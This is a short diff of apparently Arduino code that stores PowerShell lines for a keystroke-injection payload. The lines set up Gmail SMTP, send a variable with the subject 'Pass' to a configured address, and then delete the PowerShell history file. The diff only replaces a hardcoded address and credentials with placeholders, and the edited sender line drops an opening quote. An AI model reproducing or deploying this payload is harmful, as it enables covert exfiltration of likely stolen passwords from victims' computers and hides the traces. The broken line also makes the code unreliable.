@@ -6,8 +6,8 @@ const char line1[] PROGMEM = "$ser='smtp.gmail.com';";
 const char line2[] PROGMEM = "$msg=New-Object Net.Mail.MailMessage;";
 const char line3[] PROGMEM = "$smtp=New-Object Net.Mail.SmtpClient($ser);";
 const char line4[] PROGMEM = "$smtp.EnableSsl=$True;";
-const char line5[] PROGMEM = "$smtp.Credentials=New-Object System.Net.NetworkCredential('email','password');"; //If you email is example_email@gmail.com, enter example_email (Must be gmail)
-const char line6[] PROGMEM = "$msg.From='hueh123hueh@gmail.com';$msg.To.Add('email');$msg.Subject='Pass';"; //Enter full email
+const char line5[] PROGMEM = "$smtp.Credentials=New-Object System.Net.NetworkCredential('<email>','<password>');"; //If you email is example_email@gmail.com, enter example_email (Must be gmail)
+const char line6[] PROGMEM = "$msg.From=<email_from>';$msg.To.Add('<email_to>');$msg.Subject='Pass';"; //Enter full email
 const char line7[] PROGMEM = "$msg.Body=$m;$smtp.Send($msg);";
 const char line8[] PROGMEM = "del (Get-PSReadlineOption).HistorySavePath;exit\n";
 char buffer[100];
